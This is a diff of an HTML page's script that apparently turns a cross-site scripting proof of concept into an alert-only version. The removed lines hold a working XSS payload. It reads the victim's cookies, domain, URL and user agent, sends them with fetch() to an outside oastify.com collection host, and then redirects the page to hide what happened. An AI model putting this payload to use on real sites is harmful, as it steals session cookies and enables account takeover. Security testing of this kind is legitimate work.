@@ -19,29 +19,17 @@
   </div>
 
   <script>
-    // === XSS PAYLOAD START ===
-    try {
-      // 1. Steal cookies + domain
-      const data = {
-        cookie: document.cookie,
-        domain: document.domain,
-        url: location.href,
-        userAgent: navigator.userAgent
-      };
-      fetch('https://48atfchun2pqy0r8vh6x6qosyj4as4gt.oastify.com/xss?' + new URLSearchParams(data));
+    // === XSS PROOF: ALERT ONLY ===
+    setTimeout(() => {
+      alert('XSS SUCCESS!\n\nDomain: ' + document.domain + 
+            '\nURL: ' + location.href + 
+            '\nUser-Agent: ' + navigator.userAgent);
+    }, 1000);
 
-      // 2. Show alert (proof)
-      setTimeout(() => {
-        alert('XSS EXECUTED!\nDomain: ' + document.domain + '\nCookie: ' + document.cookie);
-      }, 800);
-
-      // 3. Optional: redirect to hide
-      setTimeout(() => {
-        location = 'https://example.com';
-      }, 2000);
-
-    } catch(e) {}
-    // === XSS PAYLOAD END ===
+    // Optional: redirect after 3 sec
+    setTimeout(() => {
+      location = 'https://example.com';
+    }, 3000);
   </script>
 </body>
 </html>
